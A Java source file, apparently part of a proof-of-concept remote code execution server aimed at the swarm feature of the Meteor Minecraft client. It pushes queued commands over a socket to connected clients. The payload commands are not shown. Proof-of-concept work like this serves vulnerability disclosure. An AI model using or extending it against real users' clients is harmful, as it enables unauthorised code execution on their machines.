package io.github.racoondog.meteor;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.Iterator;

public class SwarmConnection extends Thread implements AutoCloseable {
    private final Socket socket;
    private final DataOutputStream out;
    private final Iterator<Task> commandQueue = MeteorRCEProofOfConceptServer.COMMANDS.iterator();

    public SwarmConnection(Socket socket) throws IOException {
        this.socket = socket;
        this.out = new DataOutputStream(socket.getOutputStream());
        start();
    }

    public void execute(String command) throws IOException {
        out.writeUTF(command);
        out.flush();
    }

    @Override
    public void run() {
        while (!isInterrupted() && this.socket.isConnected() && this.commandQueue.hasNext()) {
            try {
                synchronized (this) {
                    Task command = this.commandQueue.next();
                    command.execute(this);
                    wait(50);
                }
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
                try {
                    close();
                } catch (IOException ignored) {}
                interrupt();
            }
        }
    }

    @Override
    public void close() throws IOException {
        out.close();
        socket.close();
    }
}
